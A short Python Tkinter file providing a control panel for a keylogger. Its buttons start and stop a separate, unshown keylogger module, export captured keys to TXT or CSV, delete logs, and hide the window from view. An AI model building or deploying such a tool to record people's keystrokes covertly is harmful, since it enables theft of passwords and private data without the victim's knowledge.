import tkinter as tk
import keylogger

def Start():
    keylogger.start_log()

def Stop():
    keylogger.stop_log()

def Exit():
    root.destroy()

def ExportTxt():
    keylogger.text_logs()

def ExportCsv():
    keylogger.csv_log(keylogger.key_list)

def Delete():
    keylogger.delete()

def Hide():
    root.withdraw()

def Interface():
    global root
    root = tk.Tk()
    
    root.geometry("590x590")
    root.resizable(0, 0)
    
    root.config(bg='#7D5A46')
    root.title("keylogger")

    Buttons = {
        'Start': Start,
        'Stop': Stop,
        'Hide': Hide,
        'Export TXT': ExportTxt,
        'Export CSV': ExportCsv,
        'Delete': Delete,
        'Exit': Exit
    }

    for i, command in Buttons.items():
        button = tk.Button(root, text=i, height=2, width=15, bg='#D2B48C', command=command)
        button.pack(padx=10, pady=15)

    root.mainloop()

if __name__ == "__main__":
    Interface()
